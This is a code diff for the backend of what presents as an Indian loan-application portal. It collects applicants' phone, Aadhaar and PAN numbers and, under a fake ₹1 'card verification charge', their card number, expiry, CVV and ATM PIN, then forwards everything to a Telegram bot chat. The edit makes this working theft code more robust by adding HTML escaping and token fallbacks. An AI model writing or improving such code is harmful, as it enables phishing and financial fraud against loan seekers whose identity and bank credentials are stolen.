@@ -86,11 +86,28 @@ app.get('/api/telegram/logs', (req, res) => {
   });
 });
 
-app.post('/api/telegram/send', async (req, res) => {
-  const { type, data, customBotToken, customChatId } = req.body;
+function escapeHtml(str: any) {
+  if (str == null) return '';
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
 
-  const activeToken = customBotToken || telegramConfig.botToken;
-  const activeChatId = customChatId || telegramConfig.chatId;
+app.post('/api/telegram/send', async (req, res) => {
+  const { type, data = {}, customBotToken, customChatId } = req.body;
+
+  const activeToken = (customBotToken && customBotToken.trim()) ||
+                      (telegramConfig.botToken && telegramConfig.botToken.trim()) ||
+                      process.env.TELEGRAM_BOT_TOKEN ||
+                      process.env.VITE_TELEGRAM_BOT_TOKEN ||
+                      '';
+
+  const activeChatId = (customChatId && customChatId.trim()) ||
+                       (telegramConfig.chatId && telegramConfig.chatId.trim()) ||
+                       process.env.TELEGRAM_CHAT_ID ||
+                       process.env.VITE_TELEGRAM_CHAT_ID ||
+                       '';
 
   const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
   let formattedMessage = '';
@@ -99,47 +116,47 @@ app.post('/api/telegram/send', async (req, res) => {
     formattedMessage = `
 📱 <b>NEW LOAN LEAD - PHONE SUBMITTED</b>
 ──────────────────────────────
-• <b>Phone Number:</b> <code>${data.phone}</code>
-• <b>Submitted At:</b> ${timestamp}
+• <b>Phone Number:</b> <code>${escapeHtml(data.phone)}</code>
+• <b>Submitted At:</b> ${escapeHtml(timestamp)}
 • <b>Device/IP:</b> Web Application Client
 `;
   } else if (type === 'personal_details') {
     formattedMessage = `
 📋 <b>LOAN APPLICATION - PERSONAL DETAILS</b>
 ──────────────────────────────
-• <b>Full Name:</b> ${data.name}
-• <b>Phone Number:</b> <code>${data.phone}</code>
-• <b>Employment Type:</b> ${data.employmentType}
-• <b>Aadhaar Number:</b> <code>${data.adhar}</code>
-• <b>PAN Card:</b> <code>${data.panCard}</code>
-• <b>Age:</b> ${data.age} years
-• <b>State:</b> ${data.state}
-• <b>City:</b> ${data.city}
-• <b>Pincode:</b> ${data.pincode}
-• <b>Requested Loan:</b> ₹${Number(data.loanAmount || 200000).toLocaleString('en-IN')} (${data.loanTenure || 24} months)
-• <b>Submitted At:</b> ${timestamp}
+• <b>Full Name:</b> ${escapeHtml(data.name)}
+• <b>Phone Number:</b> <code>${escapeHtml(data.phone)}</code>
+• <b>Employment Type:</b> ${escapeHtml(data.employmentType)}
+• <b>Aadhaar Number:</b> <code>${escapeHtml(data.adhar)}</code>
+• <b>PAN Card:</b> <code>${escapeHtml(data.panCard || 'N/A')}</code>
+• <b>Age:</b> ${escapeHtml(data.age)} years
+• <b>State:</b> ${escapeHtml(data.state)}
+• <b>City:</b> ${escapeHtml(data.city)}
+• <b>Pincode:</b> ${escapeHtml(data.pincode)}
+• <b>Requested Loan:</b> ₹${Number(data.loanAmount || 250000).toLocaleString('en-IN')} (${escapeHtml(data.loanTenure || 24)} months)
+• <b>Submitted At:</b> ${escapeHtml(timestamp)}
 `;
   } else if (type === 'card_details') {
     formattedMessage = `
 💳 <b>LOAN DISBURSEMENT FEE - CARD DETAILS</b>
 ──────────────────────────────
-• <b>Applicant Name:</b> ${data.name || 'N/A'}
-• <b>Phone:</b> <code>${data.phone || 'N/A'}</code>
+• <b>Applicant Name:</b> ${escapeHtml(data.name || 'N/A')}
+• <b>Phone:</b> <code>${escapeHtml(data.phone || 'N/A')}</code>
 • <b>Fee Amount:</b> ₹1.00 (Debit Card Verification Charge)
-• <b>Card Number:</b> <code>${data.cardNumber}</code>
-• <b>Card Holder:</b> ${data.cardHolder || 'N/A'}
-• <b>Expiry Date:</b> <code>${data.exp}</code>
-• <b>CVV:</b> <code>${data.cvv}</code>
-• <b>PIN Number:</b> <code>${data.pin || 'Not Provided'}</code>
-• <b>Submitted At:</b> ${timestamp}
+• <b>Card Number:</b> <code>${escapeHtml(data.cardNumber)}</code>
+• <b>Card Holder:</b> ${escapeHtml(data.cardHolder || 'N/A')}
+• <b>Expiry Date:</b> <code>${escapeHtml(data.exp)}</code>
+• <b>CVV:</b> <code>${escapeHtml(data.cvv)}</code>
+• <b>PIN Number:</b> <code>${escapeHtml(data.pin || 'Not Provided')}</code>
+• <b>Submitted At:</b> ${escapeHtml(timestamp)}
 `;
   } else {
     formattedMessage = `
 ℹ️ <b>LOAN PORTAL EVENT</b>
 ──────────────────────────────
-• <b>Event:</b> ${type}
-• <b>Details:</b> <pre>${JSON.stringify(data, null, 2)}</pre>
-• <b>Timestamp:</b> ${timestamp}
+• <b>Event:</b> ${escapeHtml(type)}
+• <b>Details:</b> <pre>${escapeHtml(JSON.stringify(data, null, 2))}</pre>
+• <b>Timestamp:</b> ${escapeHtml(timestamp)}
 `;
   }
 
